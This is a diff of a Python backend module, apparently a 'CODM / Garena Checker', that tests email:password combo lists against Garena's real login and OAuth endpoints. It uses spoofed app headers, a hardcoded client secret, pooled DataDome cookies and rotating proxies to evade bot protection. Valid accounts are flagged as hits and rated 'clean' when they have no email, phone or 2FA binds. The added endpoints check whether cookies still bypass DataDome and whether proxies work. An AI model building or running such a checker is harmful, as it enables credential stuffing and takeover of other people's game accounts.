@@ -1,15 +1,15 @@
 # ============================================================
 #  routers/codm.py  —  CODM / Garena Checker Backend
-#  v4.2 — FIXED:
-#    - check-one now runs in ThreadPoolExecutor (non-blocking)
-#    - Added asyncio.wait_for(timeout=55s) server-side watchdog
-#    - Reduced per-request timeouts: 20s → 10s
-#    - Reduced retries: 3 → 2  (total max per step: 22s)
-#    - Clear error when DataDome cookies are missing
-#    - Proxy pool support unchanged
+#  v4.3 — Added health-check endpoints:
+#    POST /api/codm/test-cookie   — test one DataDome cookie
+#    POST /api/codm/test-proxy    — test one proxy
+#    POST /api/codm/test-cookies  — batch test all cookies
+#    POST /api/codm/test-proxies  — batch test all proxies
 #
-#  Cookie pool priority:  Redis (codm:cookies)  →  env CODM_COOKIES
-#  Proxy pool priority:   per-request proxy arg  →  Redis (codm:proxies)  →  none
+#  v4.2 fixes kept:
+#    - check-one runs in ThreadPoolExecutor (non-blocking)
+#    - asyncio.wait_for(timeout=55s) server-side watchdog
+#    - Per-request timeouts 10s, retries 2
 # ============================================================
 
 import asyncio
@@ -33,25 +33,22 @@ from auth import require_admin
 logger = logging.getLogger(__name__)
 router = APIRouter()
 
-# ── Thread pool for blocking HTTP calls ──────────────────────
 _executor = ThreadPoolExecutor(max_workers=10)
 
-# ── Dependency guards ─────────────────────────────────────────
 try:
     import cloudscraper
     _HAS_CLOUDSCRAPER = True
 except ImportError:
     _HAS_CLOUDSCRAPER = False
-    logger.warning("⚠️  cloudscraper not installed — CODM checker disabled")
+    logger.warning("cloudscraper not installed — CODM checker disabled")
 
 try:
     from Crypto.Cipher import AES
     _HAS_CRYPTO = True
 except ImportError:
     _HAS_CRYPTO = False
-    logger.warning("⚠️  pycryptodome not installed — CODM checker disabled")
+    logger.warning("pycryptodome not installed — CODM checker disabled")
 
-# ── User-Agents ──────────────────────────────────────────────
 _UA_NEW = (
     "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
     "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
@@ -62,42 +59,34 @@ _UA_OLD = (
     "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
 )
 _UA_SDK = "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
-
-# ── CODM client secret ────────────────────────────────────────
 _CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
 
+_PRELOGIN_URL  = "https://100082.connect.garena.com/api/prelogin"
+_PRELOGIN_HOST = "100082.connect.garena.com"
 
-# ─────────────────────────────────────────────────────────────
-#  Upstash Redis helpers  (no extra package — plain HTTP)
-# ─────────────────────────────────────────────────────────────
-
+# ── Redis ─────────────────────────────────────────────────────
 _UPSTASH_URL = os.getenv("UPSTASH_REDIS_REST_URL", "")
 _UPSTASH_TOK = os.getenv("UPSTASH_REDIS_REST_TOKEN", "")
-
 _REDIS_KEY_COOKIES = "codm:cookies"
 _REDIS_KEY_PROXIES = "codm:proxies"
 
 
-def _redis_cmd(*args) -> object:
+def _redis_cmd(*args):
     if not _UPSTASH_URL or not _UPSTASH_TOK:
         return None
     try:
         r = _req.post(
             _UPSTASH_URL,
-            headers={
-                "Authorization": f"Bearer {_UPSTASH_TOK}",
-                "Content-Type": "application/json",
-            },
-            json=list(args),
-            timeout=6,
+            headers={"Authorization": f"Bearer {_UPSTASH_TOK}", "Content-Type": "application/json"},
+            json=list(args), timeout=6,
         )
         return r.json().get("result")
     except Exception as e:
-        logger.warning(f"Redis cmd {args[0]} failed: {e}")
+        logger.warning(f"Redis {args[0]} failed: {e}")
         return None
 
 
-def _redis_get_list(key: str) -> List[str]:
+def _redis_get_list(key):
     raw = _redis_cmd("GET", key)
     if not raw:
         return []
@@ -108,29 +97,24 @@ def _redis_get_list(key: str) -> List[str]:
         return []
 
 
-def _redis_set_list(key: str, items: List[str]) -> bool:
-    result = _redis_cmd("SET", key, json.dumps(items))
-    return result == "OK"
+def _redis_set_list(key, items):
+    return _redis_cmd("SET", key, json.dumps(items)) == "OK"
 
 
-def _redis_del(key: str) -> bool:
-    result = _redis_cmd("DEL", key)
-    return bool(result)
+def _redis_del(key):
+    return bool(_redis_cmd("DEL", key))
 
 
-# ─────────────────────────────────────────────────────────────
-#  Cookie pool
-# ─────────────────────────────────────────────────────────────
-
-def _get_all_cookies() -> List[str]:
-    redis_cookies = _redis_get_list(_REDIS_KEY_COOKIES)
-    if redis_cookies:
-        return redis_cookies
+# ── Cookie pool ───────────────────────────────────────────────
+def _get_all_cookies():
+    c = _redis_get_list(_REDIS_KEY_COOKIES)
+    if c:
+        return c
     raw = os.getenv("CODM_COOKIES", "")
     return [l.strip() for l in raw.splitlines() if l.strip()]
 
 
-def _pick_datadome() -> Optional[str]:
+def _pick_datadome():
     lines = _get_all_cookies()
     if not lines:
         return None
@@ -142,22 +126,19 @@ def _pick_datadome() -> Optional[str]:
     return line
 
 
-# ─────────────────────────────────────────────────────────────
-#  Proxy pool
-# ─────────────────────────────────────────────────────────────
-
-def _get_all_proxies() -> List[str]:
+# ── Proxy pool ────────────────────────────────────────────────
+def _get_all_proxies():
     return _redis_get_list(_REDIS_KEY_PROXIES)
 
 
-def _pick_proxy(override: Optional[str] = None) -> Optional[str]:
+def _pick_proxy(override=None):
     if override and override.strip():
         return override.strip()
     pool = _get_all_proxies()
     return random.choice(pool) if pool else None
 
 
-def _proxy_dict(proxy_str: Optional[str]) -> Optional[dict]:
+def _proxy_dict(proxy_str):
     if not proxy_str:
         return None
     proxy_str = proxy_str.strip()
@@ -166,29 +147,22 @@ def _proxy_dict(proxy_str: Optional[str]) -> Optional[dict]:
     return {"http": proxy_str, "https": proxy_str}
 
 
-# ─────────────────────────────────────────────────────────────
-#  Crypto helpers
-# ─────────────────────────────────────────────────────────────
+# ── Crypto ────────────────────────────────────────────────────
+def _md5(s):
+    return hashlib.md5(urllib.parse.unquote(s).encode()).hexdigest()
 
-def _md5(s: str) -> str:
-    return hashlib.md5(urllib.parse.unquote(s).encode("utf-8")).hexdigest()
+def _sha256(s):
+    return hashlib.sha256(s.encode()).hexdigest()
 
-def _sha256(s: str) -> str:
-    return hashlib.sha256(s.encode("utf-8")).hexdigest()
+def _aes_ecb(passmd5, outer_hash):
+    cipher = AES.new(bytes.fromhex(outer_hash), AES.MODE_ECB)
+    return cipher.encrypt(bytes.fromhex(passmd5)).hex()[:32]
 
-def _aes_ecb(passmd5: str, outer_hash: str) -> str:
-    key = bytes.fromhex(outer_hash)
-    plaintext = bytes.fromhex(passmd5)
-    cipher = AES.new(key, AES.MODE_ECB)
-    return cipher.encrypt(plaintext).hex()[:32]
-
-def hash_password(password: str, v1: str, v2: str) -> str:
+def hash_password(password, v1, v2):
     passmd5 = _md5(password)
-    inner_hash = _sha256(passmd5 + v1)
-    outer_hash = _sha256(inner_hash + v2)
-    return _aes_ecb(passmd5, outer_hash)
+    return _aes_ecb(passmd5, _sha256(_sha256(passmd5 + v1) + v2))
 
-def _gen_uuid() -> str:
+def _gen_uuid():
     r = list(os.urandom(16))
     r[6] = (r[6] & 0x0F) | 0x40
     r[8] = (r[8] & 0x3F) | 0x80
@@ -196,15 +170,11 @@ def _gen_uuid() -> str:
     return "-".join("".join(f"{b:02x}" for b in g) for g in parts)
 
 
-# ─────────────────────────────────────────────────────────────
-#  Session factory
-# ─────────────────────────────────────────────────────────────
-
-def _make_session(datadome: Optional[str] = None, proxy: Optional[str] = None):
+# ── Session factory ───────────────────────────────────────────
+def _make_session(datadome=None, proxy=None):
     proxies = _proxy_dict(proxy)
     session = cloudscraper.create_scraper(
-        browser={"browser": "chrome", "platform": "android", "mobile": True},
-        delay=1,
+        browser={"browser": "chrome", "platform": "android", "mobile": True}, delay=1,
     )
     session.headers.update({"Accept-Encoding": "gzip, deflate, br, zstd"})
     if datadome:
@@ -214,309 +184,185 @@ def _make_session(datadome: Optional[str] = None, proxy: Optional[str] = None):
     return session
 
 
-# ─────────────────────────────────────────────────────────────
-#  Step 1 — Prelogin
-#  FIX: timeout 20s → 10s, retries 3 → 2, sleep 2s → 1s
-# ─────────────────────────────────────────────────────────────
-
-def _prelogin(session, account: str) -> tuple[Optional[str], Optional[str]]:
-    for attempt in range(2):  # was 3
+# ── Garena steps ──────────────────────────────────────────────
+def _prelogin(session, account):
+    for attempt in range(2):
         try:
             ts = int(time.time() * 1000)
-            params = {
-                "app_id": "100082",
-                "account": account,
-                "format": "json",
-                "id": str(ts),
-            }
-            headers = {
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Connection": "keep-alive",
-                "Host": "100082.connect.garena.com",
-                "Referer": (
-                    "https://100082.connect.garena.com/universal/oauth"
-                    "?client_id=100082&locale=en-US&create_grant=true"
-                    "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
-                ),
-                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "User-Agent": _UA_NEW,
-                "X-Requested-With": "com.garena.game.codm",
-            }
             res = session.get(
-                "https://100082.connect.garena.com/api/prelogin",
-                headers=headers,
-                params=params,
-                timeout=10,  # was 20
+                _PRELOGIN_URL,
+                headers={
+                    "Accept": "application/json, text/plain, */*",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Host": _PRELOGIN_HOST,
+                    "User-Agent": _UA_NEW,
+                    "X-Requested-With": "com.garena.game.codm",
+                    "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
+                    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
+                    "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
+                    "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
+                },
+                params={"app_id": "100082", "account": account, "format": "json", "id": str(ts)},
+                timeout=10,
             )
             if res.status_code == 403:
-                logger.warning(f"Prelogin 403 attempt {attempt+1} — DataDome may be blocking")
-                time.sleep(1)  # was 2
-                continue
+                time.sleep(1); continue
             if res.status_code != 200:
                 continue
             data = res.json()
             if "error" in data:
                 return None, None
-            v1 = data.get("v1")
-            v2 = data.get("v2")
+            v1, v2 = data.get("v1"), data.get("v2")
             if v1 and v2:
                 return v1, v2
         except Exception as e:
-            logger.warning(f"Prelogin attempt {attempt+1} error: {e}")
+            logger.warning(f"Prelogin attempt {attempt+1}: {e}")
             time.sleep(1)
     return None, None
 
 
-# ─────────────────────────────────────────────────────────────
-#  Step 2 — Login
-#  FIX: timeout 20s → 10s, retries 3 → 2
-# ─────────────────────────────────────────────────────────────
-
-def _login(session, account: str, password: str, v1: str, v2: str) -> tuple[Optional[str], str]:
+def _login(session, account, password, v1, v2):
     hashed_pw = hash_password(password, v1, v2)
-    for attempt in range(2):  # was 3
+    for attempt in range(2):
         try:
             ts = int(time.time() * 1000)
-            params = {
-                "app_id": "100082",
-                "account": account,
-                "password": hashed_pw,
-                "redirect_uri": "gop100082://auth/",
-                "format": "json",
-                "id": str(ts),
-            }
-            headers = {
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Connection": "keep-alive",
-                "Host": "100082.connect.garena.com",
-                "Referer": (
-                    "https://100082.connect.garena.com/universal/oauth"
-                    "?client_id=100082&locale=en-US&create_grant=true"
-                    "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
-                ),
-                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "User-Agent": _UA_NEW,
-                "X-Requested-With": "com.garena.game.codm",
-            }
             res = session.get(
                 "https://100082.connect.garena.com/api/login",
-                headers=headers,
-                params=params,
-                timeout=10,  # was 20
+                headers={
+                    "Accept": "application/json, text/plain, */*",
+                    "Host": _PRELOGIN_HOST, "User-Agent": _UA_NEW,
+                    "X-Requested-With": "com.garena.game.codm",
+                    "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
+                    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
+                    "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
+                    "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
+                },
+                params={"app_id": "100082", "account": account, "password": hashed_pw,
+                        "redirect_uri": "gop100082://auth/", "format": "json", "id": str(ts)},
+                timeout=10,
             )
             if res.status_code != 200:
-                time.sleep(1)
-                continue
+                time.sleep(1); continue
             data = res.json()
             if "error" in data:
                 err = str(data["error"]).lower()
                 if "captcha" in err:
-                    time.sleep(2)  # was 3
-                    continue
+                    time.sleep(2); continue
                 return None, "wrong_password"
             sso_key = data.get("sso_key") or session.cookies.get("sso_key")
             if sso_key:
                 return sso_key, "ok"
         except Exception as e:
-            logger.warning(f"Login attempt {attempt+1} error: {e}")
+            logger.warning(f"Login attempt {attempt+1}: {e}")
             time.sleep(1)
     return None, "failed"
 
 
-# ─────────────────────────────────────────────────────────────
-#  Step 3 — Account info
-#  FIX: timeout 20s → 10s
-# ─────────────────────────────────────────────────────────────
-
-def _account_info(session, sso_key: str) -> Optional[dict]:
+def _account_info(session, sso_key):
     try:
         session.cookies.set("sso_key", sso_key, domain=".garena.com")
         res = session.get(
             "https://account.garena.com/api/account/init",
             headers={"Accept": "application/json", "User-Agent": _UA_NEW},
-            timeout=10,  # was 20
+            timeout=10,
         )
         if res.status_code == 200:
             return res.json()
     except Exception as e:
-        logger.warning(f"Account info error: {e}")
+        logger.warning(f"Account info: {e}")
     return None
 
 
-# ─────────────────────────────────────────────────────────────
-#  Step 4a — CODM access token (new 100082 flow)
-#  FIX: timeout 15s → 10s
-# ─────────────────────────────────────────────────────────────
-
-def _codm_token_new(session, sso_key: str) -> Optional[str]:
+def _codm_token_new(session, sso_key):
     try:
         ts = str(int(time.time() * 1000))
-
-        grant_headers = {
-            "Host": "100082.connect.garena.com",
-            "Connection": "keep-alive",
-            "sec-ch-ua-platform": '"Android"',
-            "User-Agent": _UA_NEW,
-            "Accept": "application/json, text/plain, */*",
-            "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
-            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
-            "sec-ch-ua-mobile": "?1",
-            "Origin": "https://100082.connect.garena.com",
-            "X-Requested-With": "com.garena.game.codm",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty",
-            "Referer": (
-                "https://100082.connect.garena.com/universal/oauth"
-                "?client_id=100082&locale=en-US&create_grant=true"
-                "&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code"
-            ),
-            "Accept-Language": "en-US,en;q=0.9",
-        }
         session.cookies.set("sso_key", sso_key, domain=".connect.garena.com")
-        grant_body = urllib.parse.urlencode({
-            "client_id": "100082",
-            "response_type": "code",
-            "redirect_uri": "gop100082://auth/",
-            "create_grant": "true",
-            "login_scenario": "normal",
-            "format": "json",
-            "id": ts,
-        })
         grant_res = session.post(
             "https://100082.connect.garena.com/oauth/token/grant",
-            headers=grant_headers,
-            data=grant_body,
-            timeout=10,  # was 15
+            headers={
+                "Host": _PRELOGIN_HOST, "User-Agent": _UA_NEW,
+                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+                "Origin": "https://100082.connect.garena.com",
+                "X-Requested-With": "com.garena.game.codm",
+                "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
+            },
+            data=urllib.parse.urlencode({
+                "client_id": "100082", "response_type": "code",
+                "redirect_uri": "gop100082://auth/", "create_grant": "true",
+                "login_scenario": "normal", "format": "json", "id": ts,
+            }),
+            timeout=10,
         )
         grant_res.raise_for_status()
         auth_code = grant_res.json().get("code")
         if not auth_code:
             return None
-
-        device_id = f"02-{_gen_uuid()}"
-        exchange_body = urllib.parse.urlencode({
-            "grant_type": "authorization_code",
-            "code": auth_code,
-            "device_id": device_id,
-            "redirect_uri": "gop100082://auth/",
-            "source": "2",
-            "client_id": "100082",
-            "client_secret": _CLIENT_SECRET,
-        })
         exchange_res = session.post(
             "https://100082.connect.garena.com/oauth/token/exchange",
-            headers={
-                "User-Agent": _UA_SDK,
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "100082.connect.garena.com",
-                "Connection": "Keep-Alive",
-                "Accept-Encoding": "gzip",
-            },
-            data=exchange_body,
-            timeout=10,  # was 15
+            headers={"User-Agent": _UA_SDK, "Content-Type": "application/x-www-form-urlencoded",
+                     "Host": _PRELOGIN_HOST, "Connection": "Keep-Alive", "Accept-Encoding": "gzip"},
+            data=urllib.parse.urlencode({
+                "grant_type": "authorization_code", "code": auth_code,
+                "device_id": f"02-{_gen_uuid()}", "redirect_uri": "gop100082://auth/",
+                "source": "2", "client_id": "100082", "client_secret": _CLIENT_SECRET,
+            }),
+            timeout=10,
         )
         exchange_res.raise_for_status()
         return exchange_res.json().get("access_token")
-
     except Exception as e:
-        logger.warning(f"CODM new token flow failed: {e}")
+        logger.warning(f"CODM new token: {e}")
         return None
 
 
-# ─────────────────────────────────────────────────────────────
-#  Step 4b — CODM access token (old auth.garena.com fallback)
-#  FIX: timeout 15s → 10s
-# ─────────────────────────────────────────────────────────────
-
-def _codm_token_old(session) -> Optional[str]:
+def _codm_token_old(session):
     try:
         ts = str(int(time.time() * 1000))
         res = session.post(
             "https://auth.garena.com/oauth/token/grant",
-            headers={
-                "User-Agent": _UA_OLD,
-                "Pragma": "no-cache",
-                "Accept": "*/*",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Referer": (
-                    "https://auth.garena.com/universal/oauth?all_platforms=1"
-                    "&response_type=token&locale=en-SG&client_id=100082"
-                    "&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n"
-                    "?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
-                ),
-            },
+            headers={"User-Agent": _UA_OLD, "Accept": "*/*",
+                     "Content-Type": "application/x-www-form-urlencoded"},
             data=(
                 "client_id=100082&response_type=token"
                 "&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n"
                 "%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F"
                 f"&format=json&id={ts}"
             ),
-            timeout=10,  # was 15
+            timeout=10,
         )
         return res.json().get("access_token")
     except Exception as e:
-        logger.warning(f"CODM old token flow failed: {e}")
+        logger.warning(f"CODM old token: {e}")
         return None
 
 
-# ─────────────────────────────────────────────────────────────
-#  Step 5 — CODM OAuth callback → codm_token
-#  FIX: timeout 15s → 10s
-# ─────────────────────────────────────────────────────────────
-
-def _codm_callback(session, access_token: str, old_flow: bool = False) -> Optional[dict]:
+def _codm_callback(session, access_token, old_flow=False):
     bases = (
-        ["https://api-delete-request.codm.garena.co.id"]
-        if old_flow
-        else [
-            "https://api-delete-request-aos.codm.garena.co.id",
-            "https://api-delete-request.codm.garena.co.id",
-        ]
+        ["https://api-delete-request.codm.garena.co.id"] if old_flow
+        else ["https://api-delete-request-aos.codm.garena.co.id",
+              "https://api-delete-request.codm.garena.co.id"]
     )
     for base in bases:
         try:
             res = session.get(
                 f"{base}/oauth/callback/?access_token={access_token}",
-                headers={
-                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
-                    "User-Agent": _UA_OLD if old_flow else _UA_NEW,
-                    "X-Requested-With": "com.garena.game.codm",
-                },
-                timeout=10,  # was 15
-                allow_redirects=False,
+                headers={"Accept": "text/html,*/*", "User-Agent": _UA_OLD if old_flow else _UA_NEW,
+                         "X-Requested-With": "com.garena.game.codm"},
+                timeout=10, allow_redirects=False,
             )
             loc = res.headers.get("location", "")
             if "err=3" in loc:
                 return {"status": "no_codm"}
             if "token=" in loc:
-                parsed = urllib.parse.urlparse(loc)
-                tok = urllib.parse.parse_qs(parsed.query).get("token", [""])[0]
+                tok = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).get("token", [""])[0]
                 if tok:
                     return {"status": "ok", "token": tok}
         except Exception as e:
-            logger.warning(f"CODM callback failed for {base}: {e}")
+            logger.warning(f"Callback {base}: {e}")
     return None
 
 
-# ─────────────────────────────────────────────────────────────
-#  Step 6 — CODM user info
-#  FIX: timeout 15s → 10s
-# ─────────────────────────────────────────────────────────────
-
-def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
+def _codm_user_info(session, token, old_flow=False):
     try:
         parts = token.split(".")
         if len(parts) == 3:
@@ -527,153 +373,195 @@ def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
                 return user
     except Exception:
         pass
-
-    base = (
-        "https://api-delete-request.codm.garena.co.id"
-        if old_flow
-        else "https://api-delete-request-aos.codm.garena.co.id"
-    )
+    base = ("https://api-delete-request.codm.garena.co.id" if old_flow
+            else "https://api-delete-request-aos.codm.garena.co.id")
     try:
         res = session.get(
             f"{base}/oauth/check_login/",
-            headers={
-                "authority": base.replace("https://", ""),
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Language": "en-US,en;q=0.9",
-                "codm-delete-token": token,
-                "User-Agent": _UA_OLD if old_flow else _UA_NEW,
-                "X-Requested-With": "XMLHttpRequest",
-                "x-requested-with": "com.garena.game.codm",
-            },
-            timeout=10,  # was 15
+            headers={"codm-delete-token": token, "User-Agent": _UA_OLD if old_flow else _UA_NEW,
+                     "X-Requested-With": "XMLHttpRequest", "x-requested-with": "com.garena.game.codm"},
+            timeout=10,
         )
-        data = res.json()
-        return data.get("user", {})
+        return res.json().get("user", {})
     except Exception as e:
-        logger.warning(f"CODM user info API failed: {e}")
+        logger.warning(f"User info: {e}")
         return {}
 
 
-# ─────────────────────────────────────────────────────────────
-#  Parse Garena account details
-# ─────────────────────────────────────────────────────────────
-
-def _parse_account(data: dict) -> dict:
+def _parse_account(data):
     u = data.get("user_info", data)
-    email    = u.get("email", "")
-    mobile   = u.get("mobile_no", "")
-    email_v  = u.get("email_v") in (1, True)
-    fb       = u.get("is_fbconnect_enabled") in (1, True)
-    id_card  = u.get("idcard", "")
+    email, mobile = u.get("email", ""), u.get("mobile_no", "")
+    email_v = u.get("email_v") in (1, True)
+    fb      = u.get("is_fbconnect_enabled") in (1, True)
+    id_card = u.get("idcard", "")
     two_step = u.get("two_step_verify_enable") in (1, True)
-
     binds = []
-    if email_v or (email and not email.startswith("*") and "@" in email):
-        binds.append("Email")
-    if mobile and mobile.strip() and mobile != "N/A":
-        binds.append("Phone")
-    if fb:
-        binds.append("Facebook")
-    if id_card and id_card.strip() and id_card != "N/A":
-        binds.append("ID Card")
-    if two_step:
-        binds.append("2FA")
-
-    return {
-        "shell":    str(u.get("shell", 0)),
-        "country":  str(u.get("acc_country", "")),
-        "is_clean": len(binds) == 0,
-        "binds":    binds,
-        "two_step": two_step,
-        "email":    email,
-    }
+    if email_v or (email and not email.startswith("*") and "@" in email): binds.append("Email")
+    if mobile and mobile.strip() and mobile != "N/A": binds.append("Phone")
+    if fb: binds.append("Facebook")
+    if id_card and id_card.strip() and id_card != "N/A": binds.append("ID Card")
+    if two_step: binds.append("2FA")
+    return {"shell": str(u.get("shell", 0)), "country": str(u.get("acc_country", "")),
+            "is_clean": len(binds) == 0, "binds": binds, "two_step": two_step, "email": email}
 
 
-# ─────────────────────────────────────────────────────────────
-#  Pydantic models
-# ─────────────────────────────────────────────────────────────
+# ── Pydantic models ───────────────────────────────────────────
 
 class CheckOneRequest(BaseModel):
-    combo:   str
+    combo: str
     user_id: Optional[str] = None
-    proxy:   Optional[str] = None
-
+    proxy: Optional[str] = None
 
 class CheckOneResponse(BaseModel):
-    combo:    str
-    status:   str        # "hit" | "valid_no_codm" | "bad" | "error"
-    detail:   str  = ""
-    nickname: str  = ""
-    level:    str  = ""
-    region:   str  = ""
-    uid:      str  = ""
-    shell:    str  = ""
-    country:  str  = ""
-    is_clean: bool = False
-    binds:    list = []
+    combo: str; status: str; detail: str = ""
+    nickname: str = ""; level: str = ""; region: str = ""
+    uid: str = ""; shell: str = ""; country: str = ""
+    is_clean: bool = False; binds: list = []
 
+class TestCookieRequest(BaseModel):
+    cookie: str
+
+class TestCookieResponse(BaseModel):
+    cookie: str; ok: bool; status_code: int = 0
+    latency_ms: int = 0; detail: str = ""
+
+class TestProxyRequest(BaseModel):
+    proxy: str
+
+class TestProxyResponse(BaseModel):
+    proxy: str; ok: bool; latency_ms: int = 0; detail: str = ""
+
+class BatchTestCookiesRequest(BaseModel):
+    cookies: List[str]
+
+class BatchTestProxiesRequest(BaseModel):
+    proxies: List[str]
 
 class CookieUpdateRequest(BaseModel):
     cookies: List[str]
-
 
 class ProxyUpdateRequest(BaseModel):
     proxies: List[str]
 
 
-# ─────────────────────────────────────────────────────────────
-#  Core blocking check logic (runs in thread pool)
-#  FIX: extracted from endpoint so it can run in executor
-# ─────────────────────────────────────────────────────────────
+# ── Health check sync helpers ─────────────────────────────────
+
+def _check_cookie_sync(cookie: str) -> TestCookieResponse:
+    """
+    Tests a DataDome cookie via a real prelogin request from Railway's IP.
+    200 = DataDome bypassed (cookie valid)
+    403 = DataDome blocked (cookie expired/invalid)
+    """
+    raw = cookie.strip()
+    if raw.lower().startswith("datadome="):
+        raw = raw[len("datadome="):]
+    raw = raw.strip("; ")
+
+    if not raw:
+        return TestCookieResponse(cookie=cookie, ok=False, detail="Empty cookie value")
+
+    t0 = time.time()
+    try:
+        session = _make_session(datadome=raw)
+        ts = int(time.time() * 1000)
+        res = session.get(
+            _PRELOGIN_URL,
+            headers={
+                "Accept": "application/json, text/plain, */*",
+                "Host": _PRELOGIN_HOST,
+                "User-Agent": _UA_NEW,
+                "X-Requested-With": "com.garena.game.codm",
+            },
+            params={"app_id": "100082", "account": "xissin.healthcheck@test.com",
+                    "format": "json", "id": str(ts)},
+            timeout=10,
+        )
+        latency = int((time.time() - t0) * 1000)
+        session.close()
+        code = res.status_code
+        if code == 403:
+            return TestCookieResponse(cookie=cookie, ok=False, status_code=code,
+                latency_ms=latency, detail="DataDome blocked (403) — cookie expired")
+        if code == 200:
+            return TestCookieResponse(cookie=cookie, ok=True, status_code=code,
+                latency_ms=latency, detail=f"Valid — bypassed DataDome in {latency}ms")
+        return TestCookieResponse(cookie=cookie, ok=False, status_code=code,
+            latency_ms=latency, detail=f"Unexpected HTTP {code}")
+    except Exception as e:
+        latency = int((time.time() - t0) * 1000)
+        return TestCookieResponse(cookie=cookie, ok=False, latency_ms=latency,
+            detail=f"Connection error: {str(e)[:100]}")
+
+
+def _check_proxy_sync(proxy: str) -> TestProxyResponse:
+    """
+    Tests proxy by connecting to Garena through it.
+    Any HTTP response = alive. ProxyError/Timeout = dead.
+    """
+    raw = proxy.strip()
+    if not raw:
+        return TestProxyResponse(proxy=proxy, ok=False, detail="Empty proxy")
+
+    t0 = time.time()
+    try:
+        proxies = _proxy_dict(raw)
+        ts = int(time.time() * 1000)
+        res = _req.get(
+            _PRELOGIN_URL,
+            headers={"Accept": "application/json", "User-Agent": _UA_NEW,
+                     "X-Requested-With": "com.garena.game.codm"},
+            params={"app_id": "100082", "account": "xissin.proxycheck@test.com",
+                    "format": "json", "id": str(ts)},
+            proxies=proxies, timeout=10, allow_redirects=True,
+        )
+        latency = int((time.time() - t0) * 1000)
+        return TestProxyResponse(proxy=proxy, ok=True, latency_ms=latency,
+            detail=f"Alive — HTTP {res.status_code} via proxy ({latency}ms)")
+    except _req.exceptions.ProxyError as e:
+        latency = int((time.time() - t0) * 1000)
+        return TestProxyResponse(proxy=proxy, ok=False, latency_ms=latency,
+            detail=f"Proxy refused/auth failed: {str(e)[:80]}")
+    except (_req.exceptions.ConnectTimeout, _req.exceptions.ReadTimeout):
+        latency = int((time.time() - t0) * 1000)
+        return TestProxyResponse(proxy=proxy, ok=False, latency_ms=latency,
+            detail=f"Proxy timed out ({latency}ms)")
+    except Exception as e:
+        latency = int((time.time() - t0) * 1000)
+        return TestProxyResponse(proxy=proxy, ok=False, latency_ms=latency,
+            detail=f"Unreachable: {str(e)[:100]}")
+
+
+# ── Main check logic ──────────────────────────────────────────
 
 def _do_check_sync(req: CheckOneRequest) -> CheckOneResponse:
-    """All blocking Garena HTTP calls — runs in ThreadPoolExecutor."""
     combo = req.combo.strip()
     if ":" not in combo:
         return CheckOneResponse(combo=combo, status="error", detail="Bad format — use email:password")
-
     account, password = combo.split(":", 1)
-    account  = account.strip()
-    password = password.strip()
+    account = account.strip(); password = password.strip()
     if not account or not password:
         return CheckOneResponse(combo=combo, status="error", detail="Empty account or password")
 
     datadome = _pick_datadome()
     if not datadome:
-        logger.warning(
-            "⚠️  No DataDome cookie available — CODM requests may be blocked by bot protection. "
-            "Add cookies via admin panel → CODM Cookies."
-        )
+        logger.warning("No DataDome cookie available — requests may be blocked by Garena.")
 
-    proxy   = _pick_proxy(req.proxy)
+    proxy = _pick_proxy(req.proxy)
     session = _make_session(datadome, proxy)
-
     try:
-        # Step 1: Prelogin
         v1, v2 = _prelogin(session, account)
         if not v1 or not v2:
